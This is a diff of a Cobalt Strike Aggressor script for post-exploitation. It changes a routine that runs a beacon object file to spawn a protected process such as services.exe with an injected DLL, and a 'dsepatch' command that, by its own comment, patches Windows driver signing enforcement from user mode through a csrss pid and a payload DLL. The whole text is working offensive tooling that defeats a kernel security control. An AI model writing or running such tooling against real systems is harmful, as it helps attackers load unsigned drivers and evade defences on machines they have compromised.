@@ -4,11 +4,15 @@
 ##
 sub ppspawn_dll {
 	$arch = barch( $1 );
-	$dlln = random_string( "12" ) . ".dll";
-	$lnkn = random_string( "12" ) . ".dll";
+	$dlln = random_string( "12" ) .".dll";
+	$lnkn = random_string( "12" ) .".dll";
 
 	if ( !-exists script_resource( "inject/ppinject." . $arch . ".o" ) ) {
 		berror( $1, "could not find ppinject object file on disk." );
+		return;
+	};
+	if ( !-exists script_resource( $2 ) ) {
+		berror( $1, "could not find ". $2 ." on disk." );
 		return;
 	};
 
@@ -22,7 +26,10 @@ sub ppspawn_dll {
 	$payb = readb( $payf, -1 );
 	closef( $payf );
 
-	$args = bof_pack( $1 "ZZZ", $dlln, $lnkn, "services.exe" );
+	##
+	## Note: Have a list of random process's to choose from.
+	##
+	$args = bof_pack( $1, "ZZZbi", $dlln, $lnkn, "services.exe", $payb, $3 );
 	beacon_inline_execute( $1, $bofb, "SpawnProtectedProcessWithLibrary", $args );
 }
 
@@ -30,13 +37,19 @@ sub ppspawn_dll {
 ## Patches driver signing enforcement from
 ## usermode.
 ##
+
 alias dsepatch {
-	ppspawn_dll( $1, "image.dll" );
+	if ( size( @_ ) != 2 ) {
+		berror( $1, "missing a pid for csrss." );
+		return;
+	};
+	ppspawn_dll( $1, "payload/dsepatch.x64.dll", $2 );
 };
 
 ##
 ## Creates a random string.
 ##
+
 sub random_string {
 	$limit = $1;
 	@random_str = @();
@@ -47,4 +60,4 @@ sub random_string {
 		add(@random_str, charAt($characters, $n));
 	}
 	return join('', @random_str);
-}
+};
